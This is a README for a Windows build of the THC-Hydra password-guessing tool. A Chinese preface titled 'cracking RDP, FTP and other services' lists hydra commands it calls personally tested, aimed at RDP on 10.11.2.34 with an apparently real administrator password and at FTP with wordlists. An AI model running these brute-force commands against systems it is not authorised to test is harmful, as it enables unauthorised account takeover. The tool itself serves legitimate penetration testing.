破解rdp，ftp等服务 

亲测试成功
=================
可参照：https://www.cnblogs.com/HC2018/articles/10125347.html

亲测命令
=================
* 在当前路径执行即可
hydra -l administrator -p Wutos2017 10.11.2.34 rdp

* 也可以通过查询文件执行
hydra -L admin.txt -P pass.txt 10.11.2.34 rdp

* 也可以执行

hydra -l admin -p password ftp://localhost/

hydra -L default_logins.txt -p test ftp://localhost/

hydra -l admin -P common_passwords.txt ftp://localhost/

hydra -L logins.txt -P passwords.txt ftp://localhost/

THC-HYDRA-windows
=================

Description
-----------
The THC-HYDRA tool compiled for Windows

Features
--------
* Latest `9.1` version (2020-07-29)
* Compiled for `x64` only from version 9.1, [older releases](#older-versions) were compiled for `x86` so they should work on `x86` and `x64` platforms
* Compiled with SSH, MySQL, PostgreSQL and RDP optional modules
* Embedded Cygwin DLLs 

Usage
-----
1. Download the [whole archive](https://github.com/maaaaz/thc-hydra-windows/archive/master.zip)
2. Extract it and run `hydra.exe`
3. Profit

Prerequisites
-------------
* [Microsoft Visual C++ 2008 Redistributable Package](https://www.microsoft.com/en-us/download/details.aspx?id=29)

Older versions
--------------
* Browse the [release section](https://github.com/maaaaz/thc-hydra-windows/releases) to find some old versions

Disclaimer & licence 
---------------------
The very same as mentioned on https://github.com/vanhauser-thc/thc-hydra.  
I don't own anything on THC brand or hydra, neither am I affiliated or working on the project.  

Last but not least, antivirus softwares might report some binaries as hacktools or even malwares: this is a known and common issue. If you don't trust this compilation, just don't download it.

Credits
-------
* The Hackers Choice "THC" https://github.com/vanhauser-thc/thc-hydra
